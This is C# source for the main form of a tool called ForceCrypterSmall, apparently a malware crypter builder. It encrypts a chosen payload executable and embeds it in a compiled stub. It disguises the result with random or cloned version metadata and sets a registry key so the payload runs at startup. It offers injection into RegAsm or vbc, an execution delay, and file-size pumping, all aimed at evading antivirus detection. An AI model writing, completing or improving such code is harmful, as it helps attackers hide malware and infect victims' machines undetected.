using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using System.Resources;
using Microsoft.Win32;
using ForceCrypterSmall.Resources;
using System.Globalization;

namespace ForceCrypterSmall
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            
            InitializeComponent();
            Size T = Screen.PrimaryScreen.WorkingArea.Size;
            Location = new Point(T.Width / 2 - Width / 2, T.Height / 2 - Height / 2);
        }

        private string RandomString(int length)
        {
            //Making a random string from the pool
            string pool = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWKYZ1234567890";
            pool += pool.ToUpper();
            string tmp = "";
            Random R = new Random();
            for (int x = 0; x < length; x++)
            {
                tmp += pool[R.Next(0, pool.Length)].ToString();
            }
            return tmp;
        }
        private string RandomNumber(int _length)
        {
            //Making a random number for the random assemblys version
            string pool = "0123456789";
            pool += pool.ToUpper();
            string tmp = "";
            Random R = new Random();
            for (int x = 0; x < _length; x++)
            {
                tmp += pool[R.Next(0, pool.Length)].ToString();
            }
            return tmp;
        }

        public void Pump(string file, int amount, bool random)
        {
            FileStream fs = new FileStream(file, FileMode.Append, FileAccess.Write);
            byte[] bytes = new byte[amount];
            if (random)
            {
                Random rand = new Random();
                rand.NextBytes(bytes);
            }
            fs.Write(bytes, 0, amount);
            fs.Close();
        }

        private void btnPayload_Click(object sender, EventArgs e)
        {
            //Open file dialog to let the user select a payload
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    ofd.Filter = "Payload|*.exe";
                    txtPayload.Text = ofd.FileName;
                }

            }
        }

        private void btnIcon_Click_1(object sender, EventArgs e)
        {
            //Open file dialog that lets the user to pick a icon
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Filter = "Icon|*.ico";
                if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    txtIcon.Text = ofd.FileName;
                }
            }
        }

        private void btnGen_Click_1(object sender, EventArgs e)
        {
            // Making a random encryption key with the RandomString we made before.
            txtEncryptionKey.Text = RandomString(25);
        }

        private void nsRandomPool1_ValueChanged(object sender)
        {
            txtEncryptionKey.Text = nsRandomPool1.Value;
        }

        private void btnRandomize_Click_1(object sender, EventArgs e)
        {
            //Giving the assembly information text boxes random strings and numbers.
            txtVersion.Text = RandomString(9);
            txtCompany.Text = RandomString(16);
            txtProduct.Text = RandomString(19);
            txtCopyright.Text = RandomString(21);
            txtTrademark.Text = RandomString(18);
            txtVersion.Text = (RandomNumber(1) + "." + RandomNumber(2) + "." + RandomNumber(1) + "." + RandomNumber(1));
            txtFVersion.Text = (RandomNumber(1) + "." + RandomNumber(1) + "." + RandomNumber(2) + "." + RandomNumber(2));
            txtDescription.Text = RandomString(17);
            txtTitle.Text = RandomString(15);
        }

        private void btnClone_Click_1(object sender, EventArgs e)
        {
            // Selecting a file to clone
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Filter = "Excutables|*.exe";
                if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    //File version info is all the assembly information about the file we picked with the open file dialog

                    FileVersionInfo myFileVersionInfo =
                    FileVersionInfo.GetVersionInfo(ofd.FileName);
                    //Changing the text boxes test to be the assembly information of the file we selected
                    txtFVersion.Text = myFileVersionInfo.FileVersion;
                    txtVersion.Text = myFileVersionInfo.ProductVersion;
                    txtProduct.Text = myFileVersionInfo.CompanyName;
                    txtDescription.Text = myFileVersionInfo.FileDescription;
                    txtCopyright.Text = myFileVersionInfo.LegalCopyright;
                    txtTrademark.Text = myFileVersionInfo.LegalTrademarks;
                    txtProduct.Text = myFileVersionInfo.ProductName;
                    txtTitle.Text = myFileVersionInfo.InternalName;
                    txtCompany.Text = myFileVersionInfo.CompanyName;

                }
            }
        }

        private void btnCrypt_Click_1(object sender, EventArgs e)
        {
            SaveFileDialog FSave = new SaveFileDialog()
            {
                Filter = "Executable Files|*.exe",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            };
            if (FSave.ShowDialog() == DialogResult.OK)
            {
                string boop = Properties.Resources.boop;
                boop = boop.Replace("[title-replace]", txtTitle.Text);
                boop = boop.Replace("[company-replace]", txtCompany.Text);
                boop = boop.Replace("[product-replace]", txtProduct.Text);
                boop = boop.Replace("[copyright-replace]", txtCopyright.Text);
                boop = boop.Replace("[trademark-replace]", txtTrademark.Text);
                boop = boop.Replace("[desc-replace]", txtDescription.Text);
                boop = boop.Replace("[version-replace]", txtVersion.Text);
                boop = boop.Replace("[fversion-replace]", txtFVersion.Text);
                boop = boop.Replace("[startup-replace]", cbStartup.Checked ? "true" : "false");
                if(cbStartup.Checked )
                    boop = boop.Replace("[regkey-replace]", txtStartup.Text);
                boop = boop.Replace("[key-replace]", txtEncryptionKey.Text);
                byte[] fBytes = File.ReadAllBytes(txtPayload.Text);
                byte[] encBytes = Encboop.PolyDexEncrypt(fBytes,txtEncryptionKey.Text);
                boop = boop.Replace("[encmethod-replace]", "polydex");
                
                if (rbItself.Checked)
                    boop = boop.Replace("[inject-replace]", "[itself]");
                if(rbRegAsm.Checked)
                    boop = boop.Replace("[inject-replace]", "[regasm]");
                if(rbVbc.Checked)
                    boop = boop.Replace("[inject-replace]", "[vbc]");
                if (cbPersistence.Checked)
                {
                    
                }

                if (cbDelay.Checked)
                    {
                        boop = boop.Replace("[delay-replace]", txtDelay.Text);
                    }

                   
                    bool worked;
                    string ResF = Path.Combine(Application.StartupPath, "Encrypted.resources");
                    using (var Writer = new ResourceWriter(ResF))
                    {
                        Writer.AddResource("encfile", encBytes);
                                           
                        Writer.Generate();
                    }
                    if (File.Exists(txtIcon.Text))
                        worked = Compiler.CompileFromSource(boop, FSave.FileName, txtIcon.Text, new string[] {ResF});
                    else
                        worked = Compiler.CompileFromSource(boop, FSave.FileName, null, new string[] {ResF});


                    if (worked)
                        MessageBox.Show("Forced!", "Succsess!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    if (cbPump.Checked)
                    {
                        if (rbRandomBytes.Checked)
                        {
                            Pump(FSave.FileName, int.Parse(txtPump.Text)*8*124, true);

                        }
                        else
                        {
                            Pump(FSave.FileName, int.Parse(txtPump.Text)*8*124, false);
                        }
                    }
                }
            }

        private void btnBinder_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    ofd.Filter = "File To Bind|*.exe";
                    txtBinder.Text = ofd.FileName;
                }

            }
        }
    }
}
